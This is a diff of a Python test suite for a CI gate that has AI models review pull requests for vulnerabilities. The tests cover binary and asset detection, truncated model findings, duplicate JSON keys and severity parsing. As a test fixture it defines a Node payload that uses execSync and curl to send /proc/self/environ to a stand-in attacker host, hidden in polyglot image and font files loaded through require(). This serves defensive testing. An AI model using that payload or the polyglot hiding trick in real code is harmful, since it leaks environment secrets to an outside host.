@@ -8,7 +8,9 @@ Round 4: binary route, pathspec excludes and lockfiles, severity/confidence
 spellings, dropped findings, duplicate keys, submodules, tests in CI.
 Round 5: assets skipped only when every name is an image/font and the block is
 really binary; symlinks, snapshots, non-asset binaries, English keys, big
-risk-only diffs, image-only PRs."""
+risk-only diffs, image-only PRs.
+Round 6: the gate's own source (U+FFFD only on added lines), assets decided by
+the new side, a finding cut before its severity, repeated keys, severity words."""
 import http.client
 import io
 import json
@@ -56,6 +58,22 @@ BASE = {ROTA: b"export async function GET(){ return new Response('ok') }\n", "RE
 PROXY = (b"import { NextResponse } from 'next/server'\nexport function proxy(req){ if(!req.cookies.get('sb'))"
          b" return NextResponse.redirect(new URL('/login', req.url)); return NextResponse.next() }\n")
 PNG = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
+JPG = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01"
+PAYLOAD = b"require('child_process').execSync('curl -d @/proc/self/environ https://attacker.invalid')\n"
+
+
+def png_real(larg, alt, semente, texto=b""):
+    """PNG de verdade (IHDR, tEXt opcional, IDAT com ruído, IEND): tem 0x0a no meio como imagem real."""
+    import random
+    import struct
+    import zlib
+    r = random.Random(semente)
+    cru = b"".join(b"\x00" + bytes(r.randrange(256) for _ in range(larg * 3)) for _ in range(alt))
+
+    def pedaco(tipo, dado):
+        return struct.pack(">I", len(dado)) + tipo + dado + struct.pack(">I", zlib.crc32(tipo + dado))
+    return (b"\x89PNG\r\n\x1a\n" + pedaco(b"IHDR", struct.pack(">IIBBBBB", larg, alt, 8, 2, 0, 0, 0))
+            + (pedaco(b"tEXt", texto) if texto else b"") + pedaco(b"IDAT", zlib.compress(cru)) + pedaco(b"IEND", b""))
 
 
 def git_em(pasta, *a, entrada=None):
@@ -795,17 +813,19 @@ class CadeiaDeReservaTest(unittest.TestCase):
     def test_Q5_binario_que_nao_e_imagem_nem_fonte_da_3(self):
         # With --text these arrive as mojibake: the model would answer [].
         pdf = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj\n"  # no NUL: only bytes that are not UTF-8
+        # Round 6: fonts/images whose signature is printable (JS polyglot) are code too.
         for nome, blob in (("src/lib/x.wasm", b"\x00asm\x01\x00\x00\x00\x01\x07\x01`\x02\x7f\x7f\x01\x7f"),
                            ("build/addon.node", b"MZ\x90\x00\x03\x00\x00\x00"), ("docs/a.pdf", pdf),
-                           ("lib/a.jar", b"PK\x03\x04\x14\x00\x08\x00")):
+                           ("lib/a.jar", b"PK\x03\x04\x14\x00\x08\x00"), ("public/f.otf", b"OTTO\x00\x0b\x00\x80"),
+                           ("public/f.woff", b"wOFF\x00\x01\x00\x00")):
             for modo in ("avisa", "barra"):
                 with self.subTest(nome=nome, modo=modo):
                     codigo, placar, modelos, _ = self.pr({nome: blob, ROTA: VULN}, {"glm-5": VAZIO_JSON}, modo=modo)
                     self.assertEqual((codigo, modelos), (3, []))
                     self.assertIn("arquivo binário não lido", placar)
         # Real image/font bytes take the asset path: skipped, the code next to them is read.
-        for nome, blob in (("public/f.ttf", b"\x00\x01\x00\x00\x00\x0c\x00\x80"), ("public/f.otf", b"OTTO\x00\x0b\x00\x80"),
-                           ("public/a.avif", b"\x00\x00\x00\x1cftypavif"), ("public/f.woff", b"wOFF\x00\x01\x00\x00"),
+        for nome, blob in (("public/f.ttf", b"\x00\x01\x00\x00\x00\x0c\x00\x80"), ("public/p.jpg", JPG),
+                           ("public/a.avif", b"\x00\x00\x00\x1cftypavif"), ("favicon.ico", b"\x00\x00\x01\x00\x01\x00"),
                            ("public/logo.png", PNG)):
             with self.subTest(nome=nome):
                 codigo, _, modelos, pedidos = self.pr({nome: blob, ROTA: VULN}, {"glm-5": VAZIO_JSON})
@@ -871,14 +891,20 @@ class CadeiaDeReservaTest(unittest.TestCase):
 
     @unittest.skipUnless(shutil.which("git"), "git not installed")
     def test_Q9_pr_so_de_imagem_ou_fonte_de_verdade_passa(self):
-        for head in ({"public/logo.png": PNG},
-                     {"public/f.woff2": b"wOF2\x00\x01\x00\x00", "public/a.webp": b"RIFF\x1a\x00\x00\x00WEBPVP8 "}):
+        for head in ({"public/logo.png": PNG}, {"public/f.ttf": b"\x00\x01\x00\x00\x00\x0c", "public/p.jpg": JPG}):
             for sem_text in (False, True):
                 for modo in ("avisa", "barra"):
                     with self.subTest(head=list(head), sem_text=sem_text, modo=modo):
                         codigo, placar, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON}, sem_text=sem_text, modo=modo)
                         self.assertEqual((codigo, modelos), (0, []))
                         self.assertIn(f"só com arquivos de imagem/fonte ({len(head)})", placar)
+        # Round 6: WOFF2/WebP signatures are printable (JS polyglot): not skipped, binary -> 3.
+        for sem_text in (False, True):
+            codigo, placar, modelos, _ = self.pr({"public/f.woff2": b"wOF2\x00\x01\x00\x00",
+                                                  "public/a.webp": b"RIFF\x1a\x00\x00\x00WEBPVP8 "},
+                                                 {"glm-5": VAZIO_JSON}, sem_text=sem_text)
+            self.assertEqual((codigo, modelos), (3, []))
+            self.assertIn("arquivo binário não lido (2", placar)
         # ...but never when git lists a file the diff does not carry.
         with tempfile.TemporaryDirectory() as d:
             dp, np_ = pr_real(d, BASE, {"public/logo.png": PNG})
@@ -886,6 +912,138 @@ class CadeiaDeReservaTest(unittest.TestCase):
             codigo, placar, modelos, _ = self.roda({"glm-5": VAZIO_JSON}, reais=(dp, np_))
         self.assertEqual((codigo, modelos), (3, []))
         self.assertIn("PARCIAL", placar)
+
+    # ---- Round 6: adversarial review of de5b824 (each failed there) ----
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_R1_diff_do_proprio_porteiro_nao_e_binario(self):
+        # This PR's own diff: porteiro.py once held a literal U+FFFD and the gate
+        # called ITSELF "arquivo binário não lido". Only added lines count now.
+        arq, fffd = "scripts/porteiro.py", chr(0xFFFD)
+        fonte = Path(porteiro.__file__).read_bytes()
+        literal = fonte.decode("utf-8").replace("\\" + "ufffd", fffd)  # the source as it was on de5b824
+        self.assertIn(fffd, literal)
+        linhas = literal.split("\n")
+        i = next(n for n, l in enumerate(linhas) if fffd in l)
+        linhas[i - 2] += "  # typo"  # one-line edit next to a U+FFFD context line
+        for nome, base, head in (("new porteiro.py", BASE, {arq: fonte}),
+                                 ("U+FFFD only on '-' lines", {arq: literal.encode()}, {arq: fonte}),
+                                 ("U+FFFD only on context lines", {arq: literal.encode()}, {arq: "\n".join(linhas).encode()})):
+            with self.subTest(nome):
+                with tempfile.TemporaryDirectory() as d:
+                    diff = Path(pr_real(d, base, head)[0]).read_bytes().decode("utf-8", "replace")
+                self.assertEqual([a for a, p in porteiro.blocos(diff) if porteiro.binario(p)], [])
+                codigo, _, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON}, base=base)
+                self.assertEqual((codigo, modelos), (0, ["glm-5"]))
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_R2_asset_decidido_pelo_lado_novo(self):
+        og, base = "public/og.png", dict(BASE, **{"public/og.png": png_real(32, 32, 1)})
+        # A real PNG modified, or deleted: skipped, no AI call.
+        for nome, head in (("modified", {og: png_real(32, 32, 2)}), ("deleted", {og: None})):
+            with self.subTest(nome):
+                codigo, placar, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON}, base=base)
+                self.assertEqual((codigo, modelos), (0, []))
+                self.assertIn("só com arquivos de imagem/fonte (1)", placar)
+        # Old image overwritten with JS text (NUL only on '-' lines): the model reads it.
+        # Same when the signature line stays and only text is added after it.
+        assinado = dict(BASE, **{og: b"\x89PNG\r\n\x00\x01\nx\n"})
+        for nome, b, head in (("overwrite", base, {og: PAYLOAD}),
+                              ("overwrite + loader", base, {og: PAYLOAD, "next.config.ts": b"require('./public/og.png')\n"}),
+                              ("signature kept, text added", assinado, {og: b"\x89PNG\r\n" + PAYLOAD + b"x\n"})):
+            with self.subTest(nome):
+                _, _, modelos, pedidos = self.pr(head, {"glm-5": VAZIO_JSON}, base=b)
+                self.assertEqual(modelos, ["glm-5"])
+                self.assertIn("execSync", self.viu(pedidos))
+        # Binary that JS still parses (printable start, NUL in a comment): never skipped, 3.
+        loader = {"next.config.ts": b"require('./public/x.png')\n"}
+        for nome, blob in (("public/x.png", b"/*\x00*/" + PAYLOAD), ("public/a.webp", b"RIFF=1/*\x00WEBP*/;" + PAYLOAD),
+                           ("public/f.woff", b"wOFF=1/*\x00*/;" + PAYLOAD), ("public/f.woff2", b"wOF2=1/*\x00*/;" + PAYLOAD),
+                           ("public/a.gif", b"GIF89a=1/*\x00*/;" + PAYLOAD), ("public/f.otf", b"OTTO=1/*\x00*/;" + PAYLOAD)):
+            with self.subTest(nome):
+                codigo, placar, modelos, _ = self.pr(dict(loader, **{nome: blob}), {"glm-5": VAZIO_JSON})
+                self.assertEqual((codigo, modelos), (3, []))
+                self.assertIn("arquivo binário não lido", placar)
+        # Line 1 not in the first hunk: nothing proves the start, so not skipped (3).
+        # a) a real image whose first lines did not change; b) a text .png in main
+        # whose later lines turn binary right after NUL context lines.
+        texto = b"a\n" * 8
+        casos = (("line 1 unchanged", dict(BASE, **{og: png_real(32, 32, 1, texto)}), {og: png_real(32, 32, 2, texto)}),
+                 ("NUL context", dict(BASE, **{og: PAYLOAD + b"a\n" * 6 + b"\x00\n" * 3 + b"z\n"}),
+                  {og: PAYLOAD + b"a\n" * 6 + b"\x00\n" * 3 + b"\x00\x01\n"}))
+        for nome, b, head in casos:
+            with self.subTest(nome):
+                codigo, placar, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON}, base=b)
+                self.assertEqual((codigo, modelos), (3, []))
+                self.assertIn("arquivo binário não lido", placar)
+
+    def test_R3_achado_comecado_e_cortado_da_3(self):
+        cortes = {
+            "C1 title first": '{"achados":[{"titulo":"SQL injection em /api/pay","arquivo":"a","linha":1,"porque":"concatena o id',
+            "C2 English": '{"achados":[{"title":"SQL injection","file":"a","description":"id is concatenated',
+            "C3 inside the key name": '{"achados":[{"severid',
+            "C4 before the value quote": '{"achados":[{"severidade":',
+            "E2 after the value quote": '{"achados":[{"titulo":"SQLi","arquivo":"a","severidade":"',
+            "findings": '{"findings":[{"title":"SQLi","file":"a',
+            "second list": '{"achados":[],"achados":[{"titulo":"SQLi',
+        }
+        for nome, corte in cortes.items():
+            for fim in ("length", "stop"):
+                with self.subTest(nome, fim=fim):
+                    codigo, placar, modelos, _ = self.roda({"glm-5": [(corte, fim), VAZIO_JSON], "kimi-k3": VAZIO_JSON})
+                    self.assertEqual((codigo, modelos), (3, ["glm-5"]))  # no retry, no reserve
+                    self.assertIn("indício de achado grave", placar)
+        # Cut after a closed empty list is not a finding: the retry may answer.
+        codigo, _, modelos, _ = self.roda({"glm-5": [('{"achados":[]', "length"), VAZIO_JSON]})
+        self.assertEqual((codigo, modelos), (0, ["glm-5", "glm-5"]))
+
+    def test_R4_chaves_repetidas_e_achado_fora_da_lista(self):
+        grave = {"titulo": "SQLi", "arquivo": "a", "severidade": "critica"}
+        barram = {
+            "D6b severidade critica then baixa": '{"achados":[{"titulo":"SQLi","arquivo":"a","severidade":"critica","severidade":"baixa"}]}',
+            "severity critical then low": '{"achados":[{"title":"SQLi","file":"a","severity":"critical","severity":"low"}]}',
+            "achados [] + findings": json.dumps({"achados": [], "findings": [grave]}),
+            "findings only": json.dumps({"findings": [grave]}),
+            "confianca 0.3 + confidence 0.95": json.dumps({"achados": [dict(grave, confianca=0.3, confidence=0.95)]}),
+            "confianca 0.95 then 0.3": '{"achados":[{"titulo":"SQLi","arquivo":"a","severidade":"alta","confianca":0.95,"confianca":0.3}]}',
+        }
+        for nome, resposta in barram.items():
+            with self.subTest(nome):
+                codigo, placar, modelos, _ = self.roda({"glm-5": resposta, "kimi-k3": VAZIO_JSON})
+                self.assertEqual((codigo, modelos), (1, ["glm-5"]))
+                self.assertIn("1 bloqueante", placar)
+        # English "findings" is the list itself: empty is a clean 0, a light one a warning.
+        for resposta, esperado in (('{"findings":[]}', "✅ **0 achados**"),
+                                   (json.dumps({"findings": [dict(grave, severidade="baixa")]}), "1 achado · 0 bloqueantes")):
+            with self.subTest(resposta):
+                codigo, placar, modelos, _ = self.roda({"glm-5": resposta, "kimi-k3": VAZIO_JSON})
+                self.assertEqual((codigo, modelos), (0, ["glm-5"]))
+                self.assertIn(esperado, placar)
+        # A finding outside the list, or an "achados" that is not a list, is out of format.
+        # With a raw critica it is an indício at once (3, no reserve); a nested
+        # "achados" list is rescued and its critica blocks (1)...
+        todas = ("glm-5", "kimi-k3", "kimi-k2.6", "gpt-6-astra", "gpt-5.5")
+        for nome, resposta, esperado in (
+                ("vulnerabilities", json.dumps({"achados": [], "vulnerabilities": [grave]}), 3),
+                ("nested", json.dumps({"achados": [], "result": {"achados": [grave]}}), 1),
+                ("achados object then []", '{"achados":' + json.dumps(grave) + ',"achados":[]}', 3)):
+            with self.subTest(nome):
+                codigo, placar, modelos, _ = self.roda({m: resposta for m in todas})
+                self.assertEqual((codigo, modelos), (esperado, ["glm-5"]))
+                self.assertIn("NÃO ANALISADO" if esperado == 3 else "1 bloqueante", placar)
+        # ...and with only a title every AI tries, then 3.
+        so_titulo = json.dumps({"achados": [], "vulnerabilities": [{"title": "SQLi", "file": "a"}]})
+        codigo, placar, modelos, _ = self.roda({m: so_titulo for m in todas})
+        self.assertEqual((codigo, modelos.count("glm-5"), modelos[-1]), (3, 3, "gpt-5.5"))
+        self.assertIn("nenhuma IA disponível", placar)
+
+    def test_R5_severidade_leve_em_outras_palavras(self):
+        casos = {"minor": "baixa", "Trivial": "baixa", "negligible": "baixa", "N/A": "baixa", "nit": "baixa",
+                 "note": "baixa", "informativo": "baixa", "Low (informational)": "baixa", "Medium (CVSS 5.3)": "media",
+                 "low/critical": "critica", "high / medium": "alta", "baixa/crítica": "critica", "(low)": "alta"}
+        self.assertEqual({k: porteiro._sev(k) for k in casos}, casos)
+        codigo, placar, _, _ = self.roda({"glm-5": json.dumps({"achados": [dict(ALTA, severidade="Minor")]})})
+        self.assertEqual(codigo, 0)  # a warning, even in "barra"
+        self.assertIn("1 achado · 0 bloqueantes", placar)
 
 
 if __name__ == "__main__":
